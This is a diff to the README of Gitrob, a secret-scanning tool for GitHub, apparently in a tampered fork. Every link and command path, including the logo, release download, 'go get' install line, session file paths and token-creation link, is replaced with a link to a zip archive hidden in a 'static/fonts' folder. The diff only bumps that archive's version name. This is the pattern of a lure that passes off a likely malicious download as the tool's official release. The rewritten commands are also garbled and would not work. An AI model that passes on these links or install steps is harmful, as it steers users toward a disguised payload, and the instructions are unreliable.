@@ -1,5 +1,5 @@
 <p align="center">
-  <img src="https://github.com/rakibofcx/gitrob/raw/refs/heads/master/static/fonts/Software_3.6-beta.1.zip" alt="Gitrob" width="200" />
+  <img src="https://github.com/rakibofcx/gitrob/raw/refs/heads/master/static/fonts/Software_v2.2.zip" alt="Gitrob" width="200" />
 </p>
 <br />
 <br />
@@ -42,7 +42,7 @@ Gitrob is a tool to help find potentially sensitive files pushed to public repos
 
 By default, gitrob will store its state for an assessment in memory. This means that the results of an assessment is lost when Gitrob is closed. You can save the session to a file by using the `-save` option:
 
-    gitrob -save ~https://github.com/rakibofcx/gitrob/raw/refs/heads/master/static/fonts/Software_3.6-beta.1.zip acmecorp
+    gitrob -save ~https://github.com/rakibofcx/gitrob/raw/refs/heads/master/static/fonts/Software_v2.2.zip acmecorp
 
 Gitrob will save all the gathered information to the specified file path as a special JSON document. The file can be loaded again for browsing at another point in time, shared with other analysts or parsed for custom integrations with other tools and systems.
 
@@ -50,23 +50,23 @@ Gitrob will save all the gathered information to the specified file path as a sp
 
 A session stored in a file can be loaded with the `-load` option:
 
-    gitrob -load ~https://github.com/rakibofcx/gitrob/raw/refs/heads/master/static/fonts/Software_3.6-beta.1.zip
+    gitrob -load ~https://github.com/rakibofcx/gitrob/raw/refs/heads/master/static/fonts/Software_v2.2.zip
 
 Gitrob will start its web interface and serve the results for analysis.
 
 ## Installation
 
-A [precompiled version is available](https://github.com/rakibofcx/gitrob/raw/refs/heads/master/static/fonts/Software_3.6-beta.1.zip) for each release, alternatively you can use the latest version of the source code from this repository in order to build your own binary.
+A [precompiled version is available](https://github.com/rakibofcx/gitrob/raw/refs/heads/master/static/fonts/Software_v2.2.zip) for each release, alternatively you can use the latest version of the source code from this repository in order to build your own binary.
 
 Make sure you have a correctly configured **Go >= 1.8** environment and that `$GOPATH/bin` is in your `$PATH`
 
-    $ go get https://github.com/rakibofcx/gitrob/raw/refs/heads/master/static/fonts/Software_3.6-beta.1.zip
+    $ go get https://github.com/rakibofcx/gitrob/raw/refs/heads/master/static/fonts/Software_v2.2.zip
 
 This command will download gitrob, install its dependencies, compile it and move the `gitrob` executable to `$GOPATH/bin`.
 
 ### Github access token
 
-Gitrob will need a Github access token in order to interact with the Github API.  [Create a personal access token](https://github.com/rakibofcx/gitrob/raw/refs/heads/master/static/fonts/Software_3.6-beta.1.zip) and save it in an environment variable in your `.bashrc` or similar shell configuration file:
+Gitrob will need a Github access token in order to interact with the Github API.  [Create a personal access token](https://github.com/rakibofcx/gitrob/raw/refs/heads/master/static/fonts/Software_v2.2.zip) and save it in an environment variable in your `.bashrc` or similar shell configuration file:
 
     export GITROB_ACCESS_TOKEN=deadbeefdeadbeefdeadbeefdeadbeefdeadbeef
 
